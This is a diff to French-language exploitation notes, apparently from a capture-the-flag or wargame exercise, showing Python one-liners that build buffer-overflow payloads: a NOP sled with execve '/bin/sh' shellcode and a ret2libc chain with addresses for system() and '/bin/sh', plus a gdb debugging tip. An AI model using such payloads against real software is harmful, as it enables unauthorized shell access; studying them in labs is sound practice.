@@ -75,7 +75,9 @@ python -c "print('\x90' * 103 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2
 NOUVELLE METHODE -> RET2LIBC
 adresse de "/bin/sh": 0xf7f897ec = \xec\x97\xf8\xf7
 adresse de system: 0xf7e6aed0  = \xd0\xae\xe6\xf7
-python -c "print('A' * 128 + '\x20\xb6\xfe\xf7' + 'B' * 12 + '\xf4\xef\xfc\xf7' + 'C' * 8 + '\xd0\xae\xe6\xf7' + '\xec\x97\xf8\xf7')"
+// python -c "print('A' * 128 + '\x20\xb6\xfe\xf7' + 'B' * 12 + '\xf4\xef\xfc\xf7' + 'C' * 8 + '\xd0\xae\xe6\xf7' + '\xec\x97\xf8\xf7')"
 python -c "print('A' * 128 + '\x20\xb6\xfe\xf7' + 'B' * 12 + '\xf4\xef\xfc\xf7' + 'C' * 8 + '\xd0\xae\xe6\xf7' + 'AAAA' + '\xec\x97\xf8\xf7')"
-
 Ça marche, j'ai perdu 4 jours dessus
+
+En fait ce qui change c'est qu'il faut `set follow-fork-mode child` pour
+pouvoir le debug avec gdb. Sinon c'est juste un ret2libc.
